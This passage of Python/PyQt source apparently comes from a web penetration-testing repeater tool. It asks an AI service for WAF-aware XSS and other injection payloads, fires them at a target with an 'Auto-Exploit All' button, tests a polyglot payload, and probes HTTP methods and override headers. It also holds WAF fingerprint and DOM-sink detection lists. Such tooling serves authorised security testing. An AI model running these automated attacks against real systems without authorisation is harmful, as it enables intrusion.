        self._ai_payload_table.setColumnWidth(3, 65)
        self._ai_payload_table.setColumnWidth(4, 214)
        self._ai_payload_table.verticalHeader().setVisible(False)
        self._ai_payload_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self._ai_payload_table.setSelectionBehavior(QTableWidget.SelectRows)
        self._ai_payload_table.setContextMenuPolicy(Qt.CustomContextMenu)
        self._ai_payload_table.customContextMenuRequested.connect(
            self._ai_payload_table_context_menu
        )
        self._ai_payload_table.setStyleSheet(
            f"QTableWidget{{background:{_bg};color:{COLOR_TEXT};gridline-color:{COLOR_BORDER};"
            f"font-family:{FONT_FAMILY_MONO};font-size:11px;border:none;}}"
            f"QHeaderView::section{{background:{_el};color:{_purple};"
            f"border:none;padding:4px;font-size:11px;font-weight:600;}}"
            f"QTableWidget::item:selected{{background:{_purple_d};}}"
        )
        vlay.addWidget(self._ai_payload_table, 1)

        # ── Auto-exploit controls ─────────────────────────────────────────
        exploit_row = QHBoxLayout()
        exploit_row.setSpacing(8)

        self._ai_autorun_btn = QPushButton("▶▶ Auto-Exploit All")
        self._ai_autorun_btn.setFixedHeight(24)
        self._ai_autorun_btn.setEnabled(False)
        self._ai_autorun_btn.setStyleSheet(
            f"QPushButton{{background:#1a3a1a;color:{COLOR_SUCCESS};border:1px solid {COLOR_SUCCESS};"
            f"border-radius:4px;font-weight:700;font-size:11px;padding:0 12px;}}"
            f"QPushButton:hover{{background:#2a4a2a;}}"
            f"QPushButton:disabled{{background:#222;color:#555;border-color:#444;}}"
        )
        self._ai_autorun_btn.clicked.connect(self._ai_auto_exploit_start)
        exploit_row.addWidget(self._ai_autorun_btn)

        self._ai_stop_btn = QPushButton("■ Stop")
        self._ai_stop_btn.setFixedHeight(24)
        self._ai_stop_btn.setEnabled(False)
        self._ai_stop_btn.setStyleSheet(
            f"QPushButton{{background:#3a1a1a;color:{COLOR_CRITICAL};border:1px solid {COLOR_CRITICAL};"
            f"border-radius:4px;font-size:11px;padding:0 10px;}}"
            f"QPushButton:disabled{{background:#222;color:#555;border-color:#444;}}"
        )
        self._ai_stop_btn.clicked.connect(self._ai_auto_exploit_stop)
        exploit_row.addWidget(self._ai_stop_btn)

        self._ai_progress_lbl = QLabel("")
        self._ai_progress_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:11px;")
        exploit_row.addWidget(self._ai_progress_lbl)
        exploit_row.addStretch()

        clear_results_btn = QPushButton("✕ Clear")
        clear_results_btn.setFixedHeight(22)
        clear_results_btn.setStyleSheet(
            f"background:{_el};color:{COLOR_TEXT_MUTED};border:1px solid {COLOR_BORDER};"
            f"border-radius:3px;font-size:11px;padding:0 8px;"
        )
        clear_results_btn.clicked.connect(self._ai_clear_payloads)
        exploit_row.addWidget(clear_results_btn)

        vlay.addLayout(exploit_row)
        return container

    def _open_ai_payloads_tab(self):
        """Switch to the AI Payloads tab and auto-detect WAF from last response."""
        idx = self.resp_tabs.indexOf(self._ai_payloads_tab_widget)
        if idx >= 0:
            self.resp_tabs.setCurrentIndex(idx)
        # Auto-fill WAF hint from current response if empty
        if not self._ai_waf_input.text().strip():
            waf = self._detect_waf_from_response()
            if waf:
                self._ai_waf_input.setText(waf)
        # Auto-detect param if field is empty
        if not self._ai_param_input.text().strip():
            self._ai_auto_detect_param()

    def _detect_waf_from_response(self) -> str:
        """Return a WAF/filter hint string based on the last response headers/body."""
        resp = self.resp_raw.toPlainText()
        if not resp:
            return ""
        resp_lower = resp.lower()
        _WAF_SIGS = [
            ("cloudflare",   "Cloudflare WAF"),
            ("x-sucuri-id",  "Sucuri WAF"),
            ("mod_security", "ModSecurity"),
            ("modsecurity",  "ModSecurity"),
            ("x-waf-event-info", "Imperva/Incapsula"),
            ("akamai",       "Akamai WAF"),
            ("x-fw-server",  "Fortinet WAF"),
            ("barracuda",    "Barracuda WAF"),
            ("bigip",        "F5 BIG-IP"),
            ("asm:",         "F5 ASM"),
            ("request rejected", "Generic WAF (request rejected)"),
            ("access denied",    "Generic WAF/block (access denied)"),
            ("forbidden",        "HTTP 403 Forbidden"),
            ("blocked",          "Generic block page"),
        ]
        for sig, label in _WAF_SIGS:
            if sig in resp_lower:
                return label
        return "No WAF detected (standard endpoint)"

    def _extract_dom_xss_context(self, html: str) -> str:
        """
        Extract inline JavaScript and DOM sink patterns from the response HTML.
        Returns a compact string (≤800 chars) to append to the AI prompt so it
        can generate DOM-XSS–specific payloads.
        """
        if not html:
            return ""
        # Split off headers if this is a raw HTTP response
        for sep in ("\r\n\r\n", "\n\n"):
            if sep in html:
                html = html.split(sep, 1)[1]
                break

        parts = []

        # 1. Inline <script> blocks — extract content, trim each to 300 chars
        script_blocks = re.findall(r'<script(?:[^>]*)>(.*?)</script>',
                                   html, re.DOTALL | re.IGNORECASE)
        for blk in script_blocks[:4]:
            blk = blk.strip()
            if blk:
                parts.append(blk[:300])

        # 2. DOM sink patterns — find lines containing known dangerous sinks
        _SINKS = (
            "innerHTML", "outerHTML", "document.write", "document.writeln",
            "eval(", "setTimeout(", "setInterval(", "location.href",
            "location.hash", "location.search", "location.replace",
            "location.assign", "src=", 'href="javascript:',
            "insertAdjacentHTML", "$.html(", "$(", "dangerouslySetInnerHTML",
        )
        sink_lines = []
        for line in html.splitlines():
            if any(s in line for s in _SINKS):
                stripped = line.strip()
                if stripped and len(stripped) < 200:
                    sink_lines.append(stripped)
        if sink_lines:
            parts.append("DOM sinks:\n" + "\n".join(sink_lines[:12]))

        # 3. Reflected param — show lines that echo back the parameter value
        orig = (self._ai_inject_original or "").strip()
        if orig and len(orig) > 2:
            for line in html.splitlines():
                if orig in line:
                    parts.append(f"Reflected in: {line.strip()[:200]}")
                    break

        combined = "\n\n".join(parts)
        return combined[:800]

    def _ai_auto_detect_param(self):
        """Guess the first parameter name from the current request and fill the Param field."""
        raw = self.request_editor.toPlainText()
        if not raw:
            return
        # 1. Selected text → use as the param VALUE (try to find the name)
        cursor = self.request_editor.textCursor()
        if cursor.hasSelection():
            sel_val = cursor.selectedText().replace('\u2029', '\n').strip()
            if sel_val:
                # Try to find the key for this value in query string or body  
                for m in re.finditer(r'([\w\-\.]+)=([^&\s\r\n]+)', raw):
                    if m.group(2) == sel_val:
                        self._ai_param_input.setText(m.group(1))
                        return
                # If not found, just note we'll use the selected text as the value
                self._ai_param_input.setText("(selected value)")
                return
        # 2. Parse query string from first line
        first_line = raw.splitlines()[0] if raw.splitlines() else ""
        qs_match = re.search(r'\?([^\s]+)', first_line)
        if qs_match:
            params = urllib.parse.parse_qsl(qs_match.group(1), keep_blank_values=True)
            if params:
                self._ai_param_input.setText(params[0][0])
                return
        # 3. Parse form body
        if "\r\n\r\n" in raw:
            body = raw.split("\r\n\r\n", 1)[1]
        elif "\n\n" in raw:
            body = raw.split("\n\n", 1)[1]
        else:
            body = ""
        if body.strip():
            params = urllib.parse.parse_qsl(body.strip(), keep_blank_values=True)
            if params:
                self._ai_param_input.setText(params[0][0])
                return
            # JSON body
            try:
                j = json.loads(body.strip())
                if isinstance(j, dict) and j:
                    self._ai_param_input.setText(next(iter(j)))
                    return
            except Exception:
                pass
        self._ai_status_lbl.setText("⚠ Could not auto-detect a parameter — please type it manually.")

    def _on_ai_payloads_generate(self):
        """Validate inputs and kick off the AI payload suggestion thread."""
        settings = self._get_ai_traffic_settings()
        if not settings:
            self._ai_status_lbl.setText("⚠ No AI settings found. Go to Edit → Tool Settings.")
            return
        provider = settings.get("ai_provider", "openai")
        if provider != "ollama":
            key_ok = (
                settings.get("ai_provider_keys", {}).get(provider, "").strip()
                or settings.get("ai_api_key", "").strip()
            )
            if not key_ok:
                self._ai_status_lbl.setText(
                    f"⚠ No API key for '{provider}'. Go to Edit → Tool Settings → AI Settings."
                )
                return

        raw = self.request_editor.toPlainText()
        if not raw.strip():
            self._ai_status_lbl.setText("⚠ Request editor is empty.")
            return

        scan_type = self._ai_scan_type_combo.currentText()
        param_name = self._ai_param_input.text().strip() or "unknown"

        # Snapshot the template + resolve current_value from selection or param
        self._ai_inject_template = raw
        cursor = self.request_editor.textCursor()
        if cursor.hasSelection():
            self._ai_inject_original = cursor.selectedText().replace('\u2029', '\n')
        else:
            # Try to read value for param_name from request
            self._ai_inject_original = self._extract_param_value(raw, param_name)

        full_response    = self.resp_raw.toPlainText()
        response_snippet = full_response[:1200]
        # For XSS scans, enrich with extracted DOM sinks / inline JS for smarter vectors
        if scan_type == "XSS":
            dom_ctx = self._extract_dom_xss_context(full_response)
            if dom_ctx:
                response_snippet = response_snippet + "\n\n--- DOM/JS Source Context ---\n" + dom_ctx
        waf_fingerprint  = self._ai_waf_input.text().strip() or self._detect_waf_from_response()

        if not waf_fingerprint:
            waf_fingerprint = "No WAF detected (standard endpoint)"

        # Stop any running thread
        if self._ai_suggest_thread and self._ai_suggest_thread.isRunning():
            self._ai_suggest_thread.quit()

        self._ai_generate_btn.setEnabled(False)
        self._ai_payload_table.setRowCount(0)
        self._ai_autorun_btn.setEnabled(False)
        self._ai_progress_lbl.setText("")
        self._ai_status_lbl.setText(
            f"⏳ Asking AI ({provider}/{settings.get('ai_model','?')}) to generate "
            f"{scan_type} payloads for '{param_name}'…"
        )

        self._ai_suggest_thread = _AiPayloadSuggestThread(
            settings, param_name,
            current_value    = self._ai_inject_original,
            response_snippet = response_snippet,
            waf_fingerprint  = waf_fingerprint,
            scan_type        = scan_type,
        )
        self._ai_suggest_thread.payloads_ready.connect(self._on_ai_payloads_ready)
        self._ai_suggest_thread.error.connect(self._on_ai_payloads_error)
        self._ai_suggest_thread.start()

    def _extract_param_value(self, raw_request: str, param_name: str) -> str:
        """Return the current value of param_name from the request (query or body)."""
        # Query string
        first_line = raw_request.splitlines()[0] if raw_request.splitlines() else ""
        qs_match = re.search(r'\?([^\s]+)', first_line)
        if qs_match:
            for k, v in urllib.parse.parse_qsl(qs_match.group(1), keep_blank_values=True):
                if k == param_name:
                    return v
        # Body
        body = ""
        if "\r\n\r\n" in raw_request:
            body = raw_request.split("\r\n\r\n", 1)[1]
        elif "\n\n" in raw_request:
            body = raw_request.split("\n\n", 1)[1]
        if body.strip():
            for k, v in urllib.parse.parse_qsl(body.strip(), keep_blank_values=True):
                if k == param_name:
                    return v
            try:
                j = json.loads(body.strip())
                if isinstance(j, dict) and param_name in j:
                    v = j[param_name]
                    return str(v) if not isinstance(v, (dict, list)) else json.dumps(v)
            except Exception:
                pass
        return ""

    def _on_ai_payloads_ready(self, payloads: list):
        """Populate the payload table after AI returns results."""
        self._ai_generate_btn.setEnabled(True)
        if not payloads:
            self._ai_status_lbl.setText("⚠ AI returned no payloads. Try adjusting the scan type or WAF hint.")
            return
        self._ai_status_lbl.setText(
            f"✅ {len(payloads)} payload(s) generated.  "
            f"Injection value: {self._ai_inject_original[:60]!r}"
        )
        self._ai_payload_table.setRowCount(0)
        _purple   = "#b48eff"
        _purple_d = "#7c5cbf"
        for row_idx, payload in enumerate(payloads):
            self._ai_payload_table.insertRow(row_idx)
            self._ai_payload_table.setRowHeight(row_idx, 38)
            # # col
            num_item = QTableWidgetItem(str(row_idx + 1))
            num_item.setTextAlignment(Qt.AlignCenter)
            num_item.setForeground(QColor(COLOR_TEXT_MUTED))
            self._ai_payload_table.setItem(row_idx, 0, num_item)
            # Payload col
            pay_item = QTableWidgetItem(payload)
            pay_item.setToolTip(payload)
            self._ai_payload_table.setItem(row_idx, 1, pay_item)
            # Status + length cols (empty until exploit run)
            self._ai_payload_table.setItem(row_idx, 2, QTableWidgetItem(""))
            self._ai_payload_table.setItem(row_idx, 3, QTableWidgetItem(""))
            # Actions cell: Apply + Apply&Send buttons
            actions_w = QWidget()
            actions_l = QHBoxLayout(actions_w)
            actions_l.setContentsMargins(3, 5, 3, 5)
            actions_l.setSpacing(4)

            apply_btn = QPushButton("Apply")
            apply_btn.setFixedHeight(28)
            apply_btn.setFixedWidth(58)
            apply_btn.setStyleSheet(
                f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
                f"border:1px solid {COLOR_BORDER};border-radius:3px;font-size:11px;padding:0 5px;"
            )
            apply_btn.clicked.connect(lambda _checked, p=payload: self._ai_apply_payload(p))

            send_btn = QPushButton("Apply+Send")
            send_btn.setFixedHeight(28)
            send_btn.setFixedWidth(90)
            send_btn.setStyleSheet(
                f"background:{_purple_d};color:#fff;border:none;"
                f"border-radius:3px;font-size:11px;padding:0 5px;"
            )
            send_btn.clicked.connect(lambda _checked, p=payload: self._ai_apply_and_send(p))

            copy_btn = QPushButton("⎘")
            copy_btn.setFixedHeight(28)
            copy_btn.setFixedWidth(28)
            copy_btn.setToolTip("Copy payload to clipboard")
            copy_btn.setStyleSheet(
                f"background:{COLOR_ELEVATED_BG};color:{_purple};"
                f"border:1px solid {_purple_d};border-radius:3px;font-size:13px;padding:0;"
            )
            copy_btn.clicked.connect(
                lambda _checked, p=payload: QApplication.clipboard().setText(p)
            )

            actions_l.addWidget(apply_btn)
            actions_l.addWidget(send_btn)
            actions_l.addWidget(copy_btn)
            self._ai_payload_table.setCellWidget(row_idx, 4, actions_w)

        self._ai_autorun_btn.setEnabled(True)

    def _on_ai_payloads_error(self, msg: str):
        self._ai_generate_btn.setEnabled(True)
        self._ai_status_lbl.setText(f"⚠ AI error: {msg}")

    def _ai_clear_payloads(self):
        self._ai_payload_table.setRowCount(0)
        self._ai_status_lbl.setText("Cleared.")
        self._ai_autorun_btn.setEnabled(False)
        self._ai_progress_lbl.setText("")

    def _ai_payload_table_context_menu(self, pos):
        """Right-click context menu on the payload table."""
        row = self._ai_payload_table.rowAt(pos.y())
        if row < 0:
            return
        item = self._ai_payload_table.item(row, 1)
        if not item:
            return
        payload = item.text()
        menu = QMenu(self)
        copy_act   = menu.addAction("⎘ Copy Payload")
        apply_act  = menu.addAction("↩ Apply to Request")
        send_act   = menu.addAction("▶ Apply + Send")
        action = menu.exec_(self._ai_payload_table.viewport().mapToGlobal(pos))
        if action == copy_act:
            QApplication.clipboard().setText(payload)
        elif action == apply_act:
            self._ai_apply_payload(payload)
        elif action == send_act:
            self._ai_apply_and_send(payload)

    def _ai_apply_payload(self, payload: str):
        """Replace the injection point in the request editor with this payload."""
        template = self._ai_inject_template or self.request_editor.toPlainText()
        orig     = self._ai_inject_original
        # If the injection point lives in the URL query string, spaces must be +
        encoded_payload = self._ai_encode_for_context(payload, template, orig)
        if orig:
            new_raw = template.replace(orig, encoded_payload, 1)
        else:
            new_raw = template + encoded_payload   # fallback: append
        self.request_editor.setPlainText(new_raw)
        self.status_bar.setText(f" Payload applied — click Send to test")
        QTimer.singleShot(3000, lambda: self.status_bar.setText("Ready"))

    def _ai_encode_for_context(self, payload: str, template: str, orig: str) -> str:
        """Return payload with spaces encoded as '+' when injection is in the query string."""
        first_line = template.splitlines()[0] if template else ""
        # Injection is in the URL if orig appears in the request line (before the first newline)
        if orig and orig in first_line:
            return payload.replace(' ', '+')
        return payload

    def _ai_apply_and_send(self, payload: str):
        """Apply payload to editor and immediately send the request."""
        self._ai_apply_payload(payload)
        QTimer.singleShot(50, self._send_request)

    def _ai_auto_exploit_start(self):
        """Start auto-exploit: iterate through all table payloads and send them."""
        rows = self._ai_payload_table.rowCount()
        if rows == 0:
            return
        host = self.host_input.text().strip() or self._parse_host_from_request()
        if not host:
            self._ai_status_lbl.setText("⚠ No host configured.")
            return
        try:
            port = int(self.port_input.text()) if self.port_input.text() else (
                443 if self.ssl_check.isChecked() else 80)
        except ValueError:
            port = 443 if self.ssl_check.isChecked() else 80

        payloads = [
            self._ai_payload_table.item(r, 1).text()
            for r in range(rows)
            if self._ai_payload_table.item(r, 1)
        ]

        # Clear Status/Length columns
        for r in range(rows):
            self._ai_payload_table.setItem(r, 2, QTableWidgetItem(""))
            self._ai_payload_table.setItem(r, 3, QTableWidgetItem(""))

        template = self._ai_inject_template or self.request_editor.toPlainText()
        original = self._ai_inject_original

        self._ai_autorun_btn.setEnabled(False)
        self._ai_stop_btn.setEnabled(True)
        self._ai_generate_btn.setEnabled(False)

        self._ai_exploit_thread = _AiExploitRunThread(
            host, port, self.ssl_check.isChecked(),
            self.timeout_spin.value(),
            template, original, payloads,
        )
        self._ai_exploit_thread.result.connect(self._ai_exploit_result)
        self._ai_exploit_thread.progress.connect(self._ai_exploit_progress)
        self._ai_exploit_thread.finished_all.connect(self._ai_exploit_finished)
        self._ai_exploit_thread.start()

    def _ai_auto_exploit_stop(self):
        if self._ai_exploit_thread and self._ai_exploit_thread.isRunning():
            self._ai_exploit_thread.stop()
        self._ai_stop_btn.setEnabled(False)
        self._ai_status_lbl.setText("⏹ Auto-exploit stopped.")

    def _ai_exploit_result(self, row: int, status: str, length: int, elapsed: float):
        """Update the result columns for a finished payload row."""
        # Colour-code status code
        try:
            code = int(status)
            if code < 300:
                color = "#98c379"
            elif code < 400:
                color = "#e5c07b"
            elif code < 500:
                color = "#e06c75"
            else:
                color = "#c678dd"
        except ValueError:
            color = COLOR_TEXT_MUTED

        status_item = QTableWidgetItem(status)
        status_item.setForeground(QColor(color))
        status_item.setTextAlignment(Qt.AlignCenter)
        self._ai_payload_table.setItem(row, 2, status_item)

        len_item = QTableWidgetItem(self._format_size(length) if length else "—")
        len_item.setTextAlignment(Qt.AlignCenter)
        len_item.setForeground(QColor(COLOR_TEXT_MUTED))
        self._ai_payload_table.setItem(row, 3, len_item)

    def _ai_exploit_progress(self, current: int, total: int):
        self._ai_progress_lbl.setText(f"{current}/{total}")

    def _ai_exploit_finished(self):
        self._ai_autorun_btn.setEnabled(True)
        self._ai_stop_btn.setEnabled(False)
        self._ai_generate_btn.setEnabled(True)
        total = self._ai_payload_table.rowCount()
        self._ai_progress_lbl.setText(f"{total}/{total} done")
        self._ai_status_lbl.setText(
            f"✅ Auto-exploit complete — {total} payload(s) sent. "
            "Review Status/Length columns for interesting responses."
        )

    # ── Public API ────────────────────────────────────────────────────────────

    def showEvent(self, event):
        super().showEvent(event)
        QTimer.singleShot(0, self._refresh_payload_buttons)

    # ── Custom Payload Buttons ────────────────────────────────────────────────

    def _refresh_payload_buttons(self):
        """Reload custom payload buttons and vuln combo from global settings."""
        try:
            gs = getattr(self.window(), "_global_settings", {}) or {}
        except Exception:
            gs = {}
        payloads = gs.get("custom_payloads", [])

        # Rebuild vuln combo while preserving current selection
        current_vuln = self.vuln_combo.currentText()
        seen: set = set()
        vulns = []
        for p in payloads:
            v = p.get("vuln", "")
            if v and v not in seen:
                seen.add(v)
                vulns.append(v)
        self.vuln_combo.blockSignals(True)
        self.vuln_combo.clear()
        self.vuln_combo.addItem("All")
        for v in vulns:
            self.vuln_combo.addItem(v)
        idx = self.vuln_combo.findText(current_vuln)
        if idx >= 0:
            self.vuln_combo.setCurrentIndex(idx)
        self.vuln_combo.blockSignals(False)

        # Show buttons for current filter
        selected = self.vuln_combo.currentText()
        filtered = payloads if selected == "All" else [
            p for p in payloads if p.get("vuln") == selected
        ]
        self._populate_payload_buttons(filtered)

    def _filter_payload_buttons(self):
        """Filter displayed payload buttons when the vuln combo changes."""
        try:
            gs = getattr(self.window(), "_global_settings", {}) or {}
        except Exception:
            gs = {}
        payloads = gs.get("custom_payloads", [])
        selected = self.vuln_combo.currentText()
        filtered = payloads if selected == "All" else [
            p for p in payloads if p.get("vuln") == selected
        ]
        self._populate_payload_buttons(filtered)

    def _populate_payload_buttons(self, payloads: list):
        """Clear and rebuild payload buttons in the scrollable toolbar area."""
        # Remove all existing buttons (the last item is the stretch)
        while self._payload_btn_layout.count() > 1:
            item = self._payload_btn_layout.takeAt(0)
            if item.widget():
                item.widget().deleteLater()

        btn_style = (
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};border-radius:3px;"
            f"padding:1px 7px;font-size:11px;}}"
            f"QPushButton:hover{{background:{COLOR_HOVER};}}"
            f"QPushButton:pressed{{background:{COLOR_BORDER};}}"
        )
        for i, p in enumerate(payloads):
            name = p.get("name", f"Payload {i + 1}")
            payload = p.get("payload", "")
            vuln = p.get("vuln", "")
            btn = QPushButton(name)
            btn.setFixedHeight(22)
            btn.setSizePolicy(QSizePolicy.Preferred, QSizePolicy.Fixed)
            btn.setToolTip(
                f"[{name} - {vuln}]\n"
                f"Selection → replaces selected text in request\n"
                f"No selection → copies payload to clipboard\n\n"
                f"{payload}"
            )
            btn.setStyleSheet(btn_style)
            btn.clicked.connect(lambda _, pl=payload: self._apply_custom_payload(pl))
            self._payload_btn_layout.insertWidget(
                self._payload_btn_layout.count() - 1, btn
            )

    # ── Check HTTP Methods ───────────────────────────────────────────────────

    def _apply_custom_payload(self, payload: str):
        """Replace selected text in the request editor, or copy to clipboard if nothing selected."""
        cursor = self.request_editor.textCursor()
        if cursor.hasSelection():
            cursor.insertText(payload)
            self.request_editor.setTextCursor(cursor)
        else:
            QApplication.clipboard().setText(payload)

    def _check_http_methods(self):
        """Open the HTTP method / override checker dialog."""
        raw = self.request_editor.toPlainText().strip()
        if not raw:
            QMessageBox.warning(self, "No Request", "Enter a request first.")
            return
        host = self.host_input.text().strip() or self._parse_host_from_request()
        if not host:
            QMessageBox.warning(self, "No Host", "Specify a host first.")
            return
        try:
            port = int(self.port_input.text()) if self.port_input.text() else (443 if self.ssl_check.isChecked() else 80)
        except ValueError:
            port = 443 if self.ssl_check.isChecked() else 80
        dlg = _MethodCheckDialog(host, port, self.ssl_check.isChecked(), raw, 15, self)
        dlg.show()

    # ── Test Polyglot ────────────────────────────────────────────────────────

    def _test_polyglot(self):
        """Replace the selected text with the polyglot payload and send."""
        cursor = self.request_editor.textCursor()
        if not cursor.hasSelection():
            QMessageBox.warning(
                self, "No Selection",
                "Select the parameter value to replace with the polyglot payload,\n"
                "then right-click and choose Test Polyglot."
            )
            return
        try:
            gs = getattr(self.window(), "_global_settings", {}) or {}
        except Exception:
            gs = {}
        payload = urllib.parse.quote(gs.get("polyglot_payload", _DEFAULT_POLYGLOT), safe='')
        cursor.insertText(payload)
        self.request_editor.setTextCursor(cursor)
        self._send_request()

    # ── Check Environments ───────────────────────────────────────────────────

    def _check_environments(self):
        """Open the environment-discovery dialog."""
        raw = self.request_editor.toPlainText().strip()
        if not raw:
            QMessageBox.warning(self, "No Request", "Enter a request first.")
            return
        host = self.host_input.text().strip() or self._parse_host_from_request()
        if not host:
            QMessageBox.warning(self, "No Host", "Specify a host first.")
            return
        try:
            port = int(self.port_input.text()) if self.port_input.text() else (443 if self.ssl_check.isChecked() else 80)
        except ValueError:
            port = 443 if self.ssl_check.isChecked() else 80
        dlg = _EnvCheckDialog(host, port, self.ssl_check.isChecked(), raw, 8, self)
        dlg.show()

    # ── Clean Request ────────────────────────────────────────────────────────

    def _clean_request(self):
        """Open the clean-request necessity analyser."""
        raw = self.request_editor.toPlainText().strip()
        if not raw:
            QMessageBox.warning(self, "No Request", "Enter a request first.")
            return
        host = self.host_input.text().strip() or self._parse_host_from_request()
        if not host:
            QMessageBox.warning(self, "No Host", "Specify a host first.")
            return
        try:
            port = int(self.port_input.text()) if self.port_input.text() else (443 if self.ssl_check.isChecked() else 80)
        except ValueError:
            port = 443 if self.ssl_check.isChecked() else 80

        def _apply(new_raw):
            self.request_editor.setPlainText(new_raw)
            self.status_bar.setText("🧹 Cleaned request applied")
            QTimer.singleShot(3000, lambda: self.status_bar.setText("Ready"))

        dlg = _CleanRequestDialog(host, port, self.ssl_check.isChecked(), raw, 15, _apply, self)
        dlg.show()



    def load_request(self, raw_request: str, host: str = "", port: int = 0, use_ssl: bool = True):
        # Pretty-print JSON body on load; content-length is recalculated at send time
        sep = "\r\n\r\n" if "\r\n\r\n" in raw_request else "\n\n"
        if sep in raw_request:
            _hdr, _bdy = raw_request.split(sep, 1)
            try:
                _s = _bdy.strip()
                if _s.startswith(("{", "[")):
                    raw_request = _hdr + sep + json.dumps(json.loads(_s), indent=2)
            except Exception:
                pass
        self.request_editor.setPlainText(raw_request)
        if host:
            self.host_input.setText(host)
        if port:
            self.port_input.setText(str(port))
        self.ssl_check.setChecked(use_ssl)
        # Auto-extract host from request if not provided
        if not host:
            m = re.search(r'^[Hh]ost:\s*(.+)$', raw_request, re.MULTILINE)
            if m:
                h = m.group(1).strip()
                if ":" in h:
                    hh, pp = h.rsplit(":", 1)
                    self.host_input.setText(hh)
                    self.port_input.setText(pp)
                else:
                    self.host_input.setText(h)
        # Auto-detect GraphQL immediately on load (no send required)
        _url = self._extract_url_for_gql(raw_request)
        self._update_gql_state(_url, raw_request, "")
        # Auto-detect JWT on load
        self._update_jwt_state(raw_request, "")


# ─────────────────────────────────────────────────────────────────────────────
# Repeater Tab  —  single flat tab bar with inline group headers
# ─────────────────────────────────────────────────────────────────────────────


# ─────────────────────────────────────────────────────────────────────────────
# HTTP Method Checker — thread + dialog
# ─────────────────────────────────────────────────────────────────────────────

_DIALOG_STYLE = f"QDialog{{background:{COLOR_BACKGROUND};color:{COLOR_TEXT};}}"
_TABLE_STYLE2 = (
    f"QTableWidget{{background:{COLOR_DARK_BG};color:{COLOR_TEXT};"
    f"gridline-color:{COLOR_BORDER};"
    f"selection-background-color:{COLOR_HOVER};}}"
    f"QHeaderView::section{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT_MUTED};"
    f"border:1px solid {COLOR_BORDER};padding:4px;}}"
)

_STATUS_COLORS = {"2": "#a6e3a1", "3": "#f9e2af", "4": "#f38ba8", "5": "#cba6f7"}


def _color_status_item(status: str) -> "QTableWidgetItem":
    item = QTableWidgetItem(status)
    item.setForeground(QColor(_STATUS_COLORS.get(status[:1], "#6c7086")))
    return item


class _MethodCheckThread(QThread):
    """Sends the request with each HTTP method and with method-override headers."""
    result_ready = pyqtSignal(str, str, int, float, bool)  # label, status, size, ms, interesting
    finished_all = pyqtSignal()

    _OVERRIDE_HEADERS = [
        "X-HTTP-Method-Override",
        "X-Method-Override",
        "X-HTTP-Method",
        "X-Original-HTTP-Method",
    ]
    _METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"]

    def __init__(self, host, port, use_ssl, raw, timeout=15, parent=None):
        super().__init__(parent)
        self.host, self.port, self.use_ssl = host, port, use_ssl
        self.raw, self.timeout = raw, timeout

    @staticmethod
    def _status(resp):
        m = re.match(r'HTTP/\S+\s+(\d+)', resp)
        return m.group(1) if m else ""

    @staticmethod
    def _set_method(raw, method):
        lines = raw.splitlines(keepends=True)
        if not lines:
            return raw
        parts = lines[0].rstrip("\r\n").split(" ", 2)
        if len(parts) >= 3:
            parts[0] = method
            lines[0] = " ".join(parts) + "\r\n"
        return "".join(lines)

    @staticmethod
    def _add_header(raw, name, value):
        sep = "\r\n\r\n" if "\r\n\r\n" in raw else "\n\n"
        if sep in raw:
            head, body = raw.split(sep, 1)
            nl = "\r\n" if sep == "\r\n\r\n" else "\n"
            return head + nl + f"{name}: {value}" + sep + body
        return raw

    def run(self):
        _dull = ("405", "501", "400", "404", "")
        for method in self._METHODS:
            req = self._set_method(self.raw, method)
            try:
                resp, ms, sz = _raw_http_send(self.host, self.port, self.use_ssl, req, self.timeout)
                st = self._status(resp)
            except Exception:
                st, ms, sz = "ERR", 0.0, 0
            self.result_ready.emit(method, st, sz, ms, st not in _dull)

        for hdr in self._OVERRIDE_HEADERS:
            for target in ("POST", "PUT", "DELETE", "PATCH"):
                req = self._add_header(self.raw, hdr, target)
                try:
                    resp, ms, sz = _raw_http_send(self.host, self.port, self.use_ssl, req, self.timeout)
                    st = self._status(resp)
                except Exception:
                    st, ms, sz = "ERR", 0.0, 0
                self.result_ready.emit(f"{hdr}: {target}", st, sz, ms, st not in _dull)

        self.finished_all.emit()


class _MethodCheckDialog(QDialog):
    def __init__(self, host, port, use_ssl, raw, timeout=15, parent=None):
        super().__init__(parent, Qt.Window)
        self.setAttribute(Qt.WA_DeleteOnClose)
        self.setWindowTitle("🔀 HTTP Method Checker")
        self.resize(820, 460)
        self.setStyleSheet(_DIALOG_STYLE)
        layout = QVBoxLayout(self)
        layout.setSpacing(6)

        info = QLabel(f"Testing HTTP methods and override headers against  <b>{host}:{port}</b>")
        info.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:12px;")
        layout.addWidget(info)

        self.table = QTableWidget(0, 5)
        self.table.setHorizontalHeaderLabels(["Method / Override Header", "Status", "Size", "Time (ms)", "⚑ Flag"])
        self.table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
        for c in (1, 2, 3, 4):
            self.table.horizontalHeader().setSectionResizeMode(c, QHeaderView.ResizeToContents)
        self.table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.table.setAlternatingRowColors(True)
        self.table.setStyleSheet(_TABLE_STYLE2)
        layout.addWidget(self.table)

        foot = QHBoxLayout()
        self._lbl = QLabel("⏳ Running…")
        self._lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:11px;")
        foot.addWidget(self._lbl)
        foot.addStretch()
        btn = QPushButton("Close")
        btn.clicked.connect(self.accept)
        foot.addWidget(btn)
        layout.addLayout(foot)

        self._t = _MethodCheckThread(host, port, use_ssl, raw, timeout, self)
        self._t.result_ready.connect(self._add_row)
        self._t.finished_all.connect(lambda: self._lbl.setText(
            f"✅ Done — {self.table.rowCount()} checks completed."))
        self._t.start()

    def _add_row(self, label, status, size, ms, interesting):
        r = self.table.rowCount()
        self.table.insertRow(r)
        self.table.setItem(r, 0, QTableWidgetItem(label))
        self.table.setItem(r, 1, _color_status_item(status))
        self.table.setItem(r, 2, QTableWidgetItem(f"{size:,} B"))
        self.table.setItem(r, 3, QTableWidgetItem(f"{ms:.0f}"))
        flag = QTableWidgetItem("⚠ Interesting" if interesting else "")
        if interesting:
